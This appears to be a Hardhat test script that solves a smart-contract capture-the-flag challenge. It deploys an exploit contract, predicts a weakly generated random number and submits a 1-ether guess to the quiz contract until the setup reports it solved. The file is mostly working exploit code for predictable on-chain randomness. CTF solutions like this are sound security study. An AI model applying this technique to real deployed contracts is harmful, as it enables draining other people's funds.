import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_iflp, CHALLENGE_iflp} from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let challenge: Contract;
let rng: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/iflp/Setup.sol:Setup`, SETUP_iflp)).connect(attacker);
    challenge = (await ethers.getContractAt(`contracts/iflp/ExampleQuizExploit.sol:ExampleQuizExploit`, CHALLENGE_iflp)).connect(attacker);
    rng = (await ethers.getContractAt(`contracts/iflp/ExampleQuizExploit.sol:Lollercoaster`, "0x25Be61724B64117DC9aC9DDd2A06B7DEc052D5cb")).connect(attacker);
});

it("prints contract address", async function () {
    expect(await setup.instance()).to.eq(CHALLENGE_iflp);
});

it("info", async function () {
    console.log((await ethers.provider.getBalance(await challenge.address)).toString());
});

it("exploit", async () => {
    exploit = await (await ethers.getContractFactory(`contracts/iflp/Exploit.sol:Exploit`, attacker)).deploy(challenge.address);
    let num = (await exploit.look()).toString();
    let guess = (215478288892339774661048584591724083033429693899 + num / 100) % 1000000;
    console.log(guess);
    console.log((await rng.randInt(1000000)).toString());
    await challenge.guess((await rng.randInt(1000000)).toString(), {value: await ethers.utils.parseEther("1")});
    expect(await setup.isSolved()).to.eq(true);
});